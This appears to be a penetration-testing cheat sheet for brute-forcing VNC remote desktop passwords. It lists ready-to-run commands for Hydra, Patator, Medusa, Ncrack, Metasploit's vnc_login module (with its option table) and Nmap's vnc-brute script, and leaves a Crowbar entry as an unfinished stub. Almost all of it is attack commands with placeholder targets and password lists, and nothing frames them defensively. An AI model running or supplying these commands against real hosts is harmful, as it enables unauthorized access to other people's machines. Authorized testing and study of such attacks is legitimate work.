# VNC

## 01 - Hydra

`$ hydra -vvv -P <password_list> -e nsr -t 16 <IP> vnc -o vnc_creds.txt`

## 02 - Crowbar

TODO: Provide a syntax of vnckey to brute force targets with crowbar

`$ crowbar`

## 03 - Patator

`$ patator vnc_login host=<IP> password=FILE0 0=<password_list> -t 1 -x retry:fgrep!='Authentication failure' --max-retries 0 -x quit:code=0 -R vnc_creds.txt`

## 04 - Medusa

`$ medusa -h <IP> -u root -P <password_list> -M vnc | tee vnc_creds.txt`

## 05 - Ncrack

`$ ncrack -V --user root -P <password_list> -oN vnc_creds.txt <IP>:5900`

## 06 - Metasploit

```
msf > use auxiliary/scanner/vnc/vnc_login

msf auxiliary(scanner/vnc/vnc_login) > options

Module options (auxiliary/scanner/vnc/vnc_login):

   Name              Current Setting                                                   Required  Description
   ----              ---------------                                                   --------  -----------
   BLANK_PASSWORDS   false                                                             no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                                                 yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                                                             no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                                                             no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                                                             no        Add all users in the current database to the list
   DB_SKIP_EXISTING  none                                                              no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
   PASSWORD                                                                            no        The password to test
   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/vnc_passwords.txt  no        File containing passwords, one per line
   Proxies                                                                             no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                                                                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT             5900                                                              yes       The target port (TCP)
   STOP_ON_SUCCESS   false                                                             yes       Stop guessing when a credential works for a host
   THREADS           1                                                                 yes       The number of concurrent threads (max one per host)
   USERNAME          <BLANK>                                                           no        A specific username to authenticate as
   USERPASS_FILE                                                                       no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false                                                             no        Try the username as the password for all users
   USER_FILE                                                                           no        File containing usernames, one per line
   VERBOSE           true                                                              yes       Whether to print output for all attempts

msf auxiliary(scanner/vnc/vnc_login) > set rhosts <IP>

msf auxiliary(scanner/vnc/vnc_login) > set rport <PORT>

msf auxiliary(scanner/vnc/vnc_login) > set PASS_FILE /path/to/passwords.txt

msf auxiliary(scanner/vnc/vnc_login) > set threads 4

msf auxiliary(scanner/vnc/vnc_login) > exploit
```

## 07 - Nmap

`$ nmap -p 5900 --script vnc-brute --script-args passdb=passwords.lst <IP>`

---
## References

- [Password Cracking VNC](https://www.hackingarticles.in/password-crackingvnc/)